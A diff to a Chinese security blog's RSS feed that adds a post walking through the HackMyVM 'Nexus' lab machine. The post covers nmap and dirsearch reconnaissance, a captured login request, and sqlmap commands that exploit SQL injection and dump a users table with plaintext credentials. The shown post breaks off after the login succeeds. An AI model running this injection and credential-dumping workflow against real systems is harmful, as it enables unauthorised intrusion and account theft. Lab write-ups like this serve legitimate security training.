@@ -1,5 +1,127 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Pingsag3 Blog</title><link>https://pingsag3.github.io</link><description>萍水相逢，恰似温柔~</description><copyright>Pingsag3 Blog</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://raw.githubusercontent.com/pingsag3/blog_img/main/images/Nazha.jpg</url><title>avatar</title><link>https://pingsag3.github.io</link></image><lastBuildDate>Fri, 30 May 2025 12:51:23 +0000</lastBuildDate><managingEditor>Pingsag3 Blog</managingEditor><ttl>60</ttl><webMaster>Pingsag3 Blog</webMaster><item><title>hackmyvm Devoops测试记录</title><link>https://pingsag3.github.io/post/hackmyvm%20Devoops-ce-shi-ji-lu.html</link><description># hackmyvm_Devoops
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Pingsag3 Blog</title><link>https://pingsag3.github.io</link><description>萍水相逢，恰似温柔~</description><copyright>Pingsag3 Blog</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://raw.githubusercontent.com/pingsag3/blog_img/main/images/Nazha.jpg</url><title>avatar</title><link>https://pingsag3.github.io</link></image><lastBuildDate>Fri, 06 Jun 2025 14:06:31 +0000</lastBuildDate><managingEditor>Pingsag3 Blog</managingEditor><ttl>60</ttl><webMaster>Pingsag3 Blog</webMaster><item><title>hackmyvm Nexus 测试记录</title><link>https://pingsag3.github.io/post/hackmyvm%20Nexus%20-ce-shi-ji-lu.html</link><description>
+### 1. 基本信息
+
+```
+靶机链接：
+https://maze-sec.com/library
+https://hackmyvm.eu/machines/machine.php?vm=Nexus
+```
+
+```shell
+难度：⭐️
+知识点：信息收集，`sql注入`，`sqlmap`使用，`find`提权，图片瘾写？
+```
+
+### 2. 信息收集
+
+### Nmap
+
+```shell
+└─# arp-scan -l | grep PCS
+192.168.31.131  08:00:27:e9:d5:85       PCS Systemtechnik GmbH
+└─# IP=192.168.31.131
+└─# nmap -sV -sC -A $IP -Pn
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 20:14 CST
+Nmap scan report for Loooower (192.168.31.131)
+Host is up (0.0016s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
+| ssh-hostkey:
+|   256 48:42:7a:cf:38:19:20:86:ea:fd:50:88:b8:64:36:46 (ECDSA)
+|_  256 9d:3d:85:29:8d:b0:77:d8:52:c2:81:bb:e9:54:d4:21 (ED25519)
+80/tcp open  http    Apache httpd 2.4.62 ((Debian))
+|_http-server-header: Apache/2.4.62 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+MAC Address: 08:00:27:E9:D5:85 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+```
+
+开放了`22、80`端口
+
+### 目录扫描
+
+```shell
+└─# dirsearch -u http://$IP  -x 403 -e txt,php,html
+[20:15:53] 200 -   13KB - /index2.php
+[20:15:54] 200 -  241B  - /login.php
+
+```
+
+`index2.php`看源码，可以发现登陆页面地址`http://[personal ip]/auth-login.php`
+
+```
+#view-source:http://192.168.31.131/index2.php
+&lt;li&gt;NEXUS MSG&gt; _ AUTHORIZATION PANEL :: http://[personal ip]/auth-login.php&lt;/li&gt;
+http://192.168.31.131/auth-login.php
+```
+
+随便用个用户名`admin/admin`登陆后显示` Acceso denegado.`，用户名处加个`'`闭合报错
+
+![image-20250606203207230](https://gitee.com/shui666/images/raw/master/images/image-20250606203207230.png)
+
+明显注入点，抓包丢给`sqlmap`一把嗦
+
+##### ` sqlmap`
+
+`sql注入`测试数据库信息
+
+```shell
+#bup-&gt;1.txt
+POST /login.php HTTP/1.1
+Host: 192.168.31.131
+Content-Length: 20
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://192.168.31.131
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.31.131/auth-login.php
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
+user=admin&amp;pass=123
+
+##sqlmap一把嗦###
+sqlmap -l 1.txt --batch
+sqlmap -l 1.txt --batch --dbs
+sqlmap -l 1.txt --batch -D php --tables
+sqlmap -l 1.txt --batch -D php -T usuarios --dump
+
+#sqlmap -l 1.txt --batch --dbs
+available databases [6]:
+[*] information_schema
+[*] mysql
+[*] Nebuchadnezzar
+[*] performance_schema
+[*] sion
+[*] sys
+#sqlmap -l 1.txt --batch -D sion --tables
+Database: sion
+[1 table]
++-------+
+| users |
++-------+
+#sqlmap -l 1.txt --batch -D sion -T users --dump
+Database: sion
+Table: users
+[2 entries]
++----+--------------------+----------+
+| id | password           | username |
++----+--------------------+----------+
+| 1  | F4ckTh3F4k3H4ck3r5 | shelly   |
+| 2  | cambiame08         | admin    |
++----+--------------------+----------+
+```
+
+获得两个用户信息`admin/cambiame08、shelly/F4ckTh3F4k3H4ck3r5`，测试两个账户都能登录，登陆后提示管理员，但是做不了啥
+
+```shell
+#http://192.168.31.131/login.php
+Acceso concedido. Bienvenido, admin
+'访问通过！管理员，欢迎登录。</description><guid isPermaLink="true">https://pingsag3.github.io/post/hackmyvm%20Nexus%20-ce-shi-ji-lu.html</guid><pubDate>Fri, 06 Jun 2025 14:06:03 +0000</pubDate></item><item><title>hackmyvm Devoops测试记录</title><link>https://pingsag3.github.io/post/hackmyvm%20Devoops-ce-shi-ji-lu.html</link><description># hackmyvm_Devoops
 
  
 
